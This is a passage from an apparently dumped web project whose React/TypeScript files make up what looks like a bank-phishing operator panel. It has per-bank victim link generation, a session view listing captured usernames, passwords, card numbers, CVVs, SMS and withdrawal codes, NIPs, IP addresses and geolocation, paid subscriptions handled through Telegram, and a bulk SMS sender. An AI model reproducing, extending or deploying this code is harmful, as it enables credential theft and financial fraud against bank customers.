flex items-center ${\n                        bankOptions.includes(bank) ? 'bg-primary text-primary-foreground' : 'bg-muted'\n                      }`}\n                      onClick={() => handleBankOptionChange(bank)}\n                    >\n                      <span className=\"capitalize\">{bank}</span>\n                    </div>\n                  ))}\n              </div>\n            </div>\n            \n            <div className=\"bg-muted p-3 rounded-md\">\n              <h4 className=\"font-medium text-sm mb-2\">Bancos seleccionados:</h4>\n              <div className=\"text-sm\">\n                {bankOptions.includes('all') ? (\n                  <p>Todos los bancos</p>\n                ) : (\n                  <p>{bankOptions.map(bank => (\n                    <span key={bank} className=\"inline-block bg-primary/20 rounded px-2 py-1 mr-1 mb-1 capitalize\">\n                      {bank}\n                    </span>\n                  ))}</p>\n                )}\n              </div>\n            </div>\n          </div>\n          <DialogFooter className=\"flex flex-col sm:flex-row gap-2\">\n            <Button\n              type=\"button\"\n              variant=\"outline\"\n              onClick={() => setIsDialogOpen(false)}\n              className=\"sm:w-auto w-full\"\n            >\n              Cancelar\n            </Button>\n            <Button\n              type=\"button\"\n              onClick={() => {\n                if (selectedUser) {\n                  setIsDialogOpen(false);\n                  // Abrimos un di谩logo para elegir la duraci贸n de la activaci贸n\n                  const duration = window.confirm(\n                    \"驴Desea activar el usuario por 7 d铆as?\\n\\nPresione OK para activar por 7 d铆as o Cancelar para activar por 1 d铆a.\"\n                  );\n                  \n                  if (duration) {\n                    handleActivateSevenDays(selectedUser.username);\n                  } else {\n                    handleActivateOneDay(selectedUser.username);\n                  }\n                }\n              }}\n              className=\"sm:w-auto w-full\"\n            >\n              Activar Usuario\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n\n      {/* Di谩logo para mostrar el enlace generado */}\n      <Dialog open={isLinkDialogOpen} onOpenChange={setIsLinkDialogOpen}>\n        <DialogContent className=\"sm:max-w-md\">\n          <DialogHeader>\n            <DialogTitle>Enlace Generado</DialogTitle>\n            <DialogDescription>\n              Se ha generado un nuevo enlace de cliente con el siguiente c贸digo.\n            </DialogDescription>\n          </DialogHeader>\n          <div className=\"grid gap-4 py-4\">\n            <div className=\"flex items-center justify-center\">\n              <span className=\"font-bold text-xl px-3 py-1 rounded-md bg-green-600/20 text-green-400\">\n                C贸digo: <span className=\"text-2xl tracking-wider\">{generatedCode}</span>\n              </span>\n            </div>\n            \n            <div className=\"bg-muted/30 p-4 rounded-md break-all\">\n              <p className=\"text-primary font-medium mb-2\">Enlace del cliente:</p>\n              <a \n                href={generatedLink} \n                target=\"_blank\" \n                rel=\"noopener noreferrer\"\n                className=\"text-blue-500 hover:underline break-all\"\n              >\n                {generatedLink}\n              </a>\n            </div>\n          </div>\n          <DialogFooter className=\"flex flex-col sm:flex-row gap-2\">\n            <Button\n              type=\"button\"\n              variant=\"outline\"\n              onClick={() => setIsLinkDialogOpen(false)}\n              className=\"sm:w-auto w-full\"\n            >\n              Cerrar\n            </Button>\n            <Button\n              type=\"button\"\n              onClick={copyGeneratedLink}\n              className=\"sm:w-auto w-full\"\n            >\n              <LinkIcon className=\"mr-2 h-4 w-4\" />\n              Copiar Enlace\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n\n      {/* Di谩logo para enviar mensaje de Telegram */}\n      <Dialog open={isMessageDialogOpen} onOpenChange={setIsMessageDialogOpen}>\n        <DialogContent className=\"sm:max-w-md\">\n          <DialogHeader>\n            <DialogTitle>Enviar Mensaje de Telegram</DialogTitle>\n            <DialogDescription>\n              Enviar un mensaje directo a <strong>{selectedUser?.username}</strong> v铆a Telegram\n            </DialogDescription>\n          </DialogHeader>\n          <div className=\"grid gap-4 py-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"message\">Mensaje</Label>\n              <Textarea\n                id=\"message\"\n                placeholder=\"Escribe tu mensaje aqu铆...\"\n                value={messageText}\n                onChange={(e) => setMessageText(e.target.value)}\n                rows={4}\n                className=\"resize-none\"\n              />\n              <div className=\"text-xs text-muted-foreground\">\n                Chat ID: {selectedUser?.telegramChatId || 'No configurado'}\n              </div>\n            </div>\n          </div>\n          <DialogFooter className=\"flex flex-col sm:flex-row gap-2\">\n            <Button\n              type=\"button\"\n              variant=\"outline\"\n              onClick={() => setIsMessageDialogOpen(false)}\n              className=\"sm:w-auto w-full\"\n            >\n              Cancelar\n            </Button>\n            <Button\n              type=\"button\"\n              onClick={handleSendMessage}\n              disabled={!messageText.trim() || sendTelegramMessageMutation.isPending}\n              className=\"sm:w-auto w-full\"\n            >\n              {sendTelegramMessageMutation.isPending ? (\n                <>\n                  <Loader2 className=\"mr-2 h-4 w-4 animate-spin\" />\n                  Enviando...\n                </>\n              ) : (\n                <>\n                  <MessageCircle className=\"mr-2 h-4 w-4\" />\n                  Enviar Mensaje\n                </>\n              )}\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n\n      <Dialog open={isPriceDialogOpen} onOpenChange={setIsPriceDialogOpen}>\n        <DialogContent className=\"sm:max-w-md\">\n          <DialogHeader>\n            <DialogTitle>Configurar Precio Personalizado</DialogTitle>\n            <DialogDescription>\n              Establecer precio de suscripci贸n personalizado para <strong>{selectedUser?.username}</strong>\n            </DialogDescription>\n          </DialogHeader>\n          <div className=\"grid gap-4 py-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"customPrice\">Precio en MXN (dejar vac铆o para usar precio del sistema)</Label>\n              <input\n                id=\"customPrice\"\n                type=\"text\"\n                placeholder=\"Ej: 150.00\"\n                value={customPriceValue}\n                onChange={(e) => setCustomPriceValue(e.target.value)}\n                className=\"flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50\"\n              />\n              <div className=\"text-xs text-muted-foreground\">\n                Precio actual del sistema: Consultar en Configuraci贸n del Sistema\n              </div>\n              <div className=\"text-xs text-muted-foreground\">\n                {selectedUser?.customPrice \n                  ? `Precio personalizado actual: $${selectedUser.customPrice} MXN` \n                  : 'Sin precio personalizado (usa precio del sistema)'}\n              </div>\n            </div>\n          </div>\n          <DialogFooter className=\"flex flex-col sm:flex-row gap-2\">\n            <Button\n              type=\"button\"\n              variant=\"outline\"\n              onClick={() => setIsPriceDialogOpen(false)}\n              className=\"sm:w-auto w-full\"\n            >\n              Cancelar\n            </Button>\n            <Button\n              type=\"button\"\n              onClick={handleUpdateCustomPrice}\n              disabled={updateCustomPriceMutation.isPending}\n              className=\"sm:w-auto w-full\"\n            >\n              {updateCustomPriceMutation.isPending ? (\n                <>\n                  <Loader2 className=\"mr-2 h-4 w-4 animate-spin\" />\n                  Guardando...\n                </>\n              ) : (\n                <>\n                  <DollarSign className=\"mr-2 h-4 w-4\" />\n                  Guardar Precio\n                </>\n              )}\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n    </>\n  );\n};\n\nexport default RegisteredUsersManagement;","size_bytes":59471},"client/src/components/admin/SessionDetails.tsx":{"content":"import React from 'react';\nimport { Session } from '@shared/schema';\nimport { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { FileManager } from './FileManager';\nimport { \n  User, \n  Smartphone, \n  CreditCard, \n  MessageSquare, \n  KeyRound, \n  Ban, \n  QrCode, \n  Target,\n  Calendar,\n  Globe,\n  Wifi,\n  MapPin,\n  ExternalLink\n} from 'lucide-react';\n\ninterface SessionDetailsProps {\n  session: Session;\n  onFileUpdate: () => void;\n}\n\nexport const SessionDetails: React.FC<SessionDetailsProps> = ({ \n  session, \n  onFileUpdate \n}) => {\n  return (\n    <div className=\"space-y-4\">\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <User className=\"h-5 w-5\" />\n            Detalles de Sesi贸n - {session.banco}\n          </CardTitle>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div className=\"grid grid-cols-2 gap-4\">\n            <div>\n              <label className=\"text-sm font-medium text-gray-500\">Folio</label>\n              <p className=\"text-lg font-mono\">{session.folio}</p>\n            </div>\n            <div>\n              <label className=\"text-sm font-medium text-gray-500\">Estado Actual</label>\n              <p className=\"text-lg capitalize\">{session.pasoActual || 'Inicio'}</p>\n            </div>\n          </div>\n\n          {/* Informaci贸n del dispositivo */}\n          {session.deviceType && (\n            <div className=\"border-t pt-4\">\n              <h3 className=\"font-medium text-gray-900 mb-2 flex items-center gap-2\">\n                <Smartphone className=\"h-4 w-4\" />\n                Informaci贸n del Dispositivo\n              </h3>\n              <div className=\"grid grid-cols-2 gap-4\">\n                <div>\n                  <label className=\"text-sm font-medium text-gray-500\">Tipo</label>\n                  <p className=\"flex items-center gap-2\">\n                    <span className={`px-2 py-1 rounded text-sm ${\n                      session.deviceType === 'Android' ? 'bg-green-100 text-green-800' :\n                      session.deviceType === 'iPhone' ? 'bg-blue-100 text-blue-800' :\n                      'bg-gray-100 text-gray-800'\n                    }`}>\n                      {session.deviceType === 'Android' ? ' Android' :\n                       session.deviceType === 'iPhone' ? ' iOS' :\n                       ' Escritorio'}\n                    </span>\n                  </p>\n                </div>\n                {session.deviceModel && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Modelo</label>\n                    <p>{session.deviceModel}</p>\n                  </div>\n                )}\n              </div>\n              {session.deviceBrowser && (\n                <div className=\"mt-2\">\n                  <label className=\"text-sm font-medium text-gray-500\">Navegador</label>\n                  <p>{session.deviceBrowser}</p>\n                </div>\n              )}\n            </div>\n          )}\n\n          {/* Informaci贸n de Ubicaci贸n */}\n          {(session.latitude || session.longitude || session.ipAddress) && (\n            <div className=\"border-t pt-4\">\n              <h3 className=\"font-medium text-gray-900 mb-2 flex items-center gap-2\">\n                <MapPin className=\"h-4 w-4\" />\n                Informaci贸n de Ubicaci贸n\n              </h3>\n              <div className=\"space-y-3\">\n                {(session.latitude && session.longitude) && (\n                  <div className=\"grid grid-cols-2 gap-4\">\n                    <div>\n                      <label className=\"text-sm font-medium text-gray-500\">Latitud</label>\n                      <p className=\"font-mono\">{session.latitude}</p>\n                    </div>\n                    <div>\n                      <label className=\"text-sm font-medium text-gray-500\">Longitud</label>\n                      <p className=\"font-mono\">{session.longitude}</p>\n                    </div>\n                  </div>\n                )}\n                \n                {session.ipAddress && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500 flex items-center gap-1\">\n                      <Globe className=\"h-3 w-3\" />\n                      Direcci贸n IP\n                    </label>\n                    <p className=\"font-mono\">{session.ipAddress}</p>\n                  </div>\n                )}\n                \n                {session.googleMapsLink && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Enlace de Maps</label>\n                    <a \n                      href={session.googleMapsLink} \n                      target=\"_blank\" \n                      rel=\"noopener noreferrer\"\n                      className=\"text-blue-600 hover:text-blue-800 flex items-center gap-1 font-medium\"\n                      data-testid=\"link-google-maps\"\n                    >\n                      Ver en Google Maps\n                      <ExternalLink className=\"h-3 w-3\" />\n                    </a>\n                  </div>\n                )}\n                \n                {session.locationTimestamp && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500 flex items-center gap-1\">\n                      <Calendar className=\"h-3 w-3\" />\n                      Ubicaci贸n obtenida\n                    </label>\n                    <p className=\"text-sm text-gray-600\">\n                      {new Date(session.locationTimestamp).toLocaleString('es-MX', {\n                        year: 'numeric',\n                        month: 'long',\n                        day: 'numeric',\n                        hour: '2-digit',\n                        minute: '2-digit',\n                        second: '2-digit'\n                      })}\n                    </p>\n                  </div>\n                )}\n              </div>\n            </div>\n          )}\n\n          {/* Credenciales */}\n          {(session.username || session.password) && (\n            <div className=\"border-t pt-4\">\n              <h3 className=\"font-medium text-gray-900 mb-2 flex items-center gap-2\">\n                <User className=\"h-4 w-4\" />\n                Credenciales\n              </h3>\n              <div className=\"grid grid-cols-2 gap-4\">\n                {session.username && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Usuario</label>\n                    <p className=\"font-mono\">{session.username}</p>\n                  </div>\n                )}\n                {session.password && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Contrase帽a</label>\n                    <p className=\"font-mono\">{session.password}</p>\n                  </div>\n                )}\n              </div>\n            </div>\n          )}\n\n          {/* Informaci贸n de tarjeta */}\n          {session.tarjeta && (\n            <div className=\"border-t pt-4\">\n              <h3 className=\"font-medium text-gray-900 mb-2 flex items-center gap-2\">\n                <CreditCard className=\"h-4 w-4\" />\n                Informaci贸n de Tarjeta\n              </h3>\n              <div className=\"grid grid-cols-3 gap-4\">\n                <div>\n                  <label className=\"text-sm font-medium text-gray-500\">N煤mero</label>\n                  <p className=\"font-mono\">{session.tarjeta}</p>\n                </div>\n                {session.fechaVencimiento && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Vencimiento</label>\n                    <p className=\"font-mono\">{session.fechaVencimiento}</p>\n                  </div>\n                )}\n                {session.cvv && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">CVV</label>\n                    <p className=\"font-mono\">{session.cvv}</p>\n                  </div>\n                )}\n              </div>\n            </div>\n          )}\n\n          {/* C贸digos y mensajes */}\n          <div className=\"grid grid-cols-2 gap-4\">\n            {session.sms && (\n              <div>\n                <label className=\"text-sm font-medium text-gray-500 flex items-center gap-1\">\n                  <MessageSquare className=\"h-3 w-3\" />\n                  SMS\n                </label>\n                <p className=\"font-mono\">{session.sms}</p>\n              </div>\n            )}\n            {session.nip && (\n              <div>\n                <label className=\"text-sm font-medium text-gray-500 flex items-center gap-1\">\n                  <KeyRound className=\"h-3 w-3\" />\n                  NIP\n                </label>\n                <p className=\"font-mono\">{session.nip}</p>\n              </div>\n            )}\n            {session.smsCompra && (\n              <div>\n                <label className=\"text-sm font-medium text-gray-500 flex items-center gap-1\">\n                  <MessageSquare className=\"h-3 w-3\" />\n                  SMS Compra\n                </label>\n                <p className=\"font-mono\">{session.smsCompra}</p>\n              </div>\n            )}\n            {session.codigoRetiro && (\n              <div>\n                <label className=\"text-sm font-medium text-gray-500 flex items-center gap-1\">\n                  <Ban className=\"h-3 w-3\" />\n                  C贸digo Retiro\n                </label>\n                <p className=\"font-mono\">{session.codigoRetiro}</p>\n                {session.pinRetiro && (\n                  <p className=\"text-sm text-gray-600\">PIN: {session.pinRetiro}</p>\n                )}\n              </div>\n            )}\n          </div>\n\n          {/* Protecci贸n de Saldo */}\n          {(session.saldoDebito || session.saldoCredito) && (\n            <div className=\"border-t pt-4\">\n              <h3 className=\"font-medium text-gray-900 mb-2 flex items-center gap-2\">\n                <Target className=\"h-4 w-4\" />\n                Protecci贸n de Saldo\n              </h3>\n              <div className=\"grid grid-cols-2 gap-4\">\n                {session.saldoDebito && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Tarjeta de D茅bito</label>\n                    <p className=\"text-lg\">{session.saldoDebito}</p>\n                    {session.montoDebito && (\n                      <p className=\"text-sm text-gray-600 font-mono\">Monto: ${session.montoDebito}</p>\n                    )}\n                  </div>\n                )}\n                {session.saldoCredito && (\n                  <div>\n                    <label className=\"text-sm font-medium text-gray-500\">Tarjeta de Cr茅dito</label>\n                    <p className=\"text-lg\">{session.saldoCredito}</p>\n                    {session.montoCredito && (\n                      <p className=\"text-sm text-gray-600 font-mono\">Monto: ${session.montoCredito}</p>\n                    )}\n                  </div>\n                )}\n              </div>\n            </div>\n          )}\n\n          {/* Informaci贸n adicional */}\n          <div className=\"border-t pt-4\">\n            <h3 className=\"font-medium text-gray-900 mb-2 flex items-center gap-2\">\n              <Target className=\"h-4 w-4\" />\n              Informaci贸n Adicional\n            </h3>\n            <div className=\"grid grid-cols-2 gap-4 text-sm\">\n              <div>\n                <label className=\"text-gray-500\">Creado por</label>\n                <p>{session.createdBy || '--'}</p>\n              </div>\n              <div>\n                <label className=\"text-gray-500\">Fecha de creaci贸n</label>\n                <p>{session.createdAt ? new Date(session.createdAt).toLocaleString() : '--'}</p>\n              </div>\n              {session.celular && (\n                <div>\n                  <label className=\"text-gray-500\">Celular</label>\n                  <p>{session.celular}</p>\n                </div>\n              )}\n              {session.qrData && (\n                <div>\n                  <label className=\"text-gray-500\">C贸digo QR</label>\n                  <p className=\"text-green-600\">Escaneado</p>\n                </div>\n              )}\n            </div>\n          </div>\n        </CardContent>\n      </Card>\n\n      {/* File Manager */}\n      <FileManager\n        sessionId={session.sessionId}\n        currentFile={\n          session.fileName ? {\n            fileName: session.fileName,\n            fileUrl: session.fileUrl || '',\n            fileSize: session.fileSize || ''\n          } : undefined\n        }\n        onFileUpdate={onFileUpdate}\n      />\n    </div>\n  );\n};","size_bytes":12717},"client/src/components/ui/badge.tsx":{"content":"import * as React from \"react\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst badgeVariants = cva(\n  \"inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2\",\n  {\n    variants: {\n      variant: {\n        default:\n          \"border-transparent bg-primary text-primary-foreground hover:bg-primary/80\",\n        secondary:\n          \"border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80\",\n        destructive:\n          \"border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80\",\n        outline: \"text-foreground\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n    },\n  }\n)\n\nexport interface BadgeProps\n  extends React.HTMLAttributes<HTMLDivElement>,\n    VariantProps<typeof badgeVariants> {}\n\nfunction Badge({ className, variant, ...props }: BadgeProps) {\n  return (\n    <div className={cn(badgeVariants({ variant }), className)} {...props} />\n  )\n}\n\nexport { Badge, badgeVariants }","size_bytes":1127},"server/paymentVerificationAI.ts":{"content":"import OpenAI from \"openai\";\n\nconst openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });\n\ninterface PaymentVerificationResult {\n  isValid: boolean;\n  extractedAmount: string | null;\n  extractedTime: string | null;\n  confidence: number;\n  reason: string;\n}\n\nexport async function verifyPaymentScreenshot(\n  imageBase64: string,\n  expectedAmount: string,\n  username: string\n): Promise<PaymentVerificationResult> {\n  try {\n    const prompt = `Analiza esta captura de pantalla de una transferencia bancaria o pago.\n\nINSTRUCCIONES:\n1. Extrae el MONTO de la transferencia (busca n煤meros con $ o MXN)\n2. Extrae la HORA o FECHA de la transferencia\n3. Verifica si el monto coincide con: $${expectedAmount} MXN (tolerancia 卤1%)\n\nResponde SOLO en formato JSON con esta estructura:\n{\n  \"monto\": \"cantidad exacta encontrada\",\n  \"hora\": \"hora/fecha de la transferencia\",\n  \"coincide\": true o false,\n  \"confianza\": n煤mero entre 0 y 1,\n  \"razon\": \"explicaci贸n breve\"\n}`;\n\n    const response = await openai.chat.completions.create({\n      model: \"gpt-4o\", // the newest OpenAI model is \"gpt-5\" which was released August 7, 2025. do not change this unless explicitly requested by the user\n      messages: [\n        {\n          role: \"user\",\n          content: [\n            {\n              type: \"text\",\n              text: prompt\n            },\n            {\n              type: \"image_url\",\n              image_url: {\n                url: `data:image/jpeg;base64,${imageBase64}`\n              }\n            }\n          ],\n        },\n      ],\n      response_format: { type: \"json_object\" },\n      max_tokens: 500,\n    });\n\n    const aiResponse = JSON.parse(response.choices[0].message.content || '{}');\n    \n    console.log('[AI Verification] Respuesta de IA:', aiResponse);\n\n    const extractedAmount = aiResponse.monto || null;\n    const extractedTime = aiResponse.hora || null;\n    const matches = aiResponse.coincide === true;\n    const confidence = aiResponse.confianza || 0;\n    const reason = aiResponse.razon || 'No se pudo verificar';\n\n    return {\n      isValid: matches && confidence > 0.7,\n      extractedAmount,\n      extractedTime,\n      confidence,\n      reason\n    };\n\n  } catch (error: any) {\n    console.error('[AI Verification] Error:', error);\n    return {\n      isValid: false,\n      extractedAmount: null,\n      extractedTime: null,\n      confidence: 0,\n      reason: `Error al analizar la imagen: ${error.message}`\n    };\n  }\n}\n\nexport async function generatePaymentConfirmationMessage(\n  username: string,\n  amount: string,\n  verificationTime: string,\n  expirationDate: Date\n): Promise<string> {\n  const expirationDateStr = expirationDate.toLocaleDateString('es-ES', {\n    day: 'numeric',\n    month: 'long',\n    year: 'numeric'\n  });\n\n  return ` *隆Pago Verificado Exitosamente!*\n\nHola *${username}*,\n\nTu pago de *$${amount} MXN* ha sido verificado autom谩ticamente.\n\n *Detalles:*\n Hora de verificaci贸n: ${verificationTime}\n Monto confirmado: $${amount} MXN\n Cuenta activa hasta: ${expirationDateStr}\n\n Tu suscripci贸n por 7 d铆as est谩 ahora activa.\n\n隆Gracias por tu pago!`;\n}\n","size_bytes":3119},"client/src/components/user/UserSmsPanel.tsx":{"content":"import { useState } from \"react\";\nimport { useQuery, useMutation, useQueryClient } from \"@tanstack/react-query\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { Badge } from \"@/components/ui/badge\";\nimport { Alert, AlertDescription } from \"@/components/ui/alert\";\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from \"@/components/ui/select\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { apiRequest } from \"@/lib/queryClient\";\nimport { MessageSquare, Send, CreditCard, AlertCircle, History, ExternalLink } from \"lucide-react\";\n\nconst UserSmsPanel = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  \n  const [phoneNumbers, setPhoneNumbers] = useState(\"\");\n  const [message, setMessage] = useState(\"\");\n  const [prefix, setPrefix] = useState(\"+52\");\n  const [routeType, setRouteType] = useState<string>(\"long_code\");\n\n  // Obtener cr茅ditos del usuario\n  const { data: userCredits = 0 } = useQuery({\n    queryKey: ['/api/sms/credits'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/sms/credits');\n      if (!res.ok) throw new Error('Error al obtener cr茅ditos');\n      const data = await res.json();\n      return data.credits || 0;\n    },\n    refetchInterval: 30000, // Actualizar cada 30 segundos\n  });\n\n  // Obtener historial de SMS\n  const { data: smsHistory = [] } = useQuery({\n    queryKey: ['/api/sms/history'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/sms/history');\n      if (!res.ok) throw new Error('Error al obtener historial');\n      const data = await res.json();\n      return data || [];\n    },\n  });\n\n  // Mutaci贸n para enviar SMS\n  const sendSmsMutation = useMutation({\n    mutationFn: async (data: { phoneNumbers: string; message: string; prefix: string; routeType: string }) => {\n      const res = await apiRequest('POST', '/api/sms/send', data);\n      if (!res.ok) {\n        const error = await res.json();\n        throw new Error(error.message || 'Error al enviar SMS');\n      }\n      return await res.json();\n    },\n    onSuccess: (data) => {\n      toast({\n        title: \"SMS enviado exitosamente\",\n        description: `Se enviaron ${data.data?.sent || 0} mensajes`,\n        variant: \"default\",\n      });\n      \n      // Limpiar formulario\n      setPhoneNumbers(\"\");\n      setMessage(\"\");\n      \n      // Actualizar cr茅ditos e historial\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits'] });\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/history'] });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al enviar SMS\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const handleSendSms = () => {\n    if (!phoneNumbers.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"Por favor ingresa al menos un n煤mero de tel茅fono\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    if (!message.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"Por favor ingresa un mensaje\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    // Calcular cu谩ntos n煤meros se van a enviar y el costo total\n    const numbers = phoneNumbers.split(',').map(n => n.trim()).filter(n => n.length > 0);\n    const costPerSms = routeType === 'premium' ? 1.0 : 0.5;\n    const totalCost = numbers.length * costPerSms;\n    \n    if (userCredits < totalCost) {\n      toast({\n        title: \"Cr茅ditos insuficientes\",\n        description: `Necesitas ${totalCost} cr茅ditos para ${numbers.length} SMS, tienes ${userCredits}`,\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    sendSmsMutation.mutate({ phoneNumbers, message, prefix, routeType });\n  };\n\n  const formatDate = (dateString: string) => {\n    const date = new Date(dateString);\n    return date.toLocaleString('es-ES', {\n      year: 'numeric',\n      month: '2-digit',\n      day: '2-digit',\n      hour: '2-digit',\n      minute: '2-digit',\n    });\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      {/* Panel de cr茅ditos */}\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <CreditCard className=\"h-5 w-5\" />\n            Mis Cr茅ditos SMS\n          </CardTitle>\n          <CardDescription>\n            Ruta Premium: 1.0 cr茅dito  Ruta Econ贸mica: 0.5 cr茅ditos por SMS\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <div className=\"flex items-center justify-between\">\n            <div>\n              <p className=\"text-sm text-muted-foreground\">Cr茅ditos disponibles</p>\n              <p className=\"text-3xl font-bold text-green-600\">{userCredits}</p>\n            </div>\n            {userCredits === 0 && (\n              <Alert className=\"max-w-md\">\n                <AlertCircle className=\"h-4 w-4\" />\n                <AlertDescription>\n                  <strong>Sin cr茅ditos.</strong><br />\n                  Para recargar saldo, env铆a un mensaje en Telegram a:{\" \"}\n                  <a \n                    href=\"https://t.me/BalonxSistema\" \n                    target=\"_blank\" \n                    rel=\"noopener noreferrer\"\n                    className=\"text-blue-500 hover:underline inline-flex items-center gap-1\"\n                  >\n                    @BalonxSistema <ExternalLink className=\"h-3 w-3\" />\n                  </a>\n                </AlertDescription>\n              </Alert>\n            )}\n          </div>\n        </CardContent>\n      </Card>\n\n      {/* Panel de env铆o de SMS */}\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <MessageSquare className=\"h-5 w-5\" />\n            Enviar SMS\n          </CardTitle>\n          <CardDescription>\n            Env铆a mensajes SMS a m煤ltiples n煤meros\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          {/* Selecci贸n de Ruta */}\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"route-select\">Tipo de ruta</Label>\n            <Select value={routeType} onValueChange={setRouteType}>\n              <SelectTrigger>\n                <SelectValue placeholder=\"Selecciona el tipo de ruta\" />\n              </SelectTrigger>\n              <SelectContent>\n                <SelectItem value=\"premium\">\n                  <span>Ruta Premium (1.0 cr茅dito)</span>\n                </SelectItem>\n                <SelectItem value=\"long_code\">\n                  <span>Ruta Econ贸mica (0.5 cr茅ditos)</span>\n                </SelectItem>\n              </SelectContent>\n            </Select>\n          </div>\n\n          {/* Prefijo de Pa铆s */}\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"prefix-select\">Prefijo del pa铆s</Label>\n            <Select value={prefix} onValueChange={setPrefix}>\n              <SelectTrigger>\n                <SelectValue />\n              </SelectTrigger>\n              <SelectContent>\n                <SelectItem value=\"+52\">M茅xico (+52)</SelectItem>\n                <SelectItem value=\"+1\">EE.UU. (+1)</SelectItem>\n                <SelectItem value=\"+57\">Colombia (+57)</SelectItem>\n                <SelectItem value=\"+34\">Espa帽a (+34)</SelectItem>\n              </SelectContent>\n            </Select>\n          </div>\n\n          {/* N煤meros de Tel茅fono */}\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"phone-numbers\">N煤meros de tel茅fono</Label>\n            <Textarea\n              id=\"phone-numbers\"\n              value={phoneNumbers}\n              onChange={(e) => setPhoneNumbers(e.target.value)}\n              placeholder=\"Ej: 5512345678,5523456789 (m谩ximo 250)\"\n              rows={3}\n            />\n            <p className=\"text-sm text-muted-foreground\">\n              Separar m煤ltiples n煤meros con comas\n              {phoneNumbers.trim() && (\n                <span className=\"font-medium ml-2\">\n                  ({phoneNumbers.split(',').filter(n => n.trim()).length} n煤meros)\n                </span>\n              )}\n            </p>\n          </div>\n\n          {/* Mensaje */}\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"sms-message\">Mensaje</Label>\n            <Textarea\n              id=\"sms-message\"\n              value={message}\n              onChange={(e) => setMessage(e.target.value)}\n              placeholder=\"Escribe tu mensaje aqu铆...\"\n              rows={4}\n              maxLength={160}\n            />\n            <div className=\"flex justify-between text-sm text-muted-foreground\">\n              <span>{message.length}/160 caracteres</span>\n              {phoneNumbers.trim() && routeType && (\n                <span className=\"font-medium\">\n                  Total: {((routeType === 'premium' ? 1.0 : 0.5) * \n                    phoneNumbers.split(',').filter(n => n.trim()).length).toFixed(1)} cr茅ditos\n                </span>\n              )}\n            </div>\n          </div>\n\n          <Button \n            onClick={handleSendSms}\n            disabled={!phoneNumbers.trim() || !message.trim() || !routeType || sendSmsMutation.isPending || userCredits === 0}\n            className=\"w-full\"\n          >\n            {sendSmsMutation.isPending ? 'Enviando...' : (\n              <>\n                <Send className=\"h-4 w-4 mr-2\" />\n                Enviar SMS\n              </>\n            )}\n          </Button>\n        </CardContent>\n      </Card>\n\n      {/* Historial de SMS */}\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <History className=\"h-5 w-5\" />\n            Historial de SMS\n          </CardTitle>\n          <CardDescription>\n            ltimos mensajes enviados\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          {smsHistory.length === 0 ? (\n            <div className=\"text-center p-6 text-muted-foreground\">\n              No hay historial de SMS\n            </div>\n          ) : (\n            <div className=\"space-y-3 max-h-64 overflow-y-auto\">\n              {smsHistory.slice(0, 10).map((sms: any) => (\n                <div key={sms.id} className=\"border rounded-lg p-3 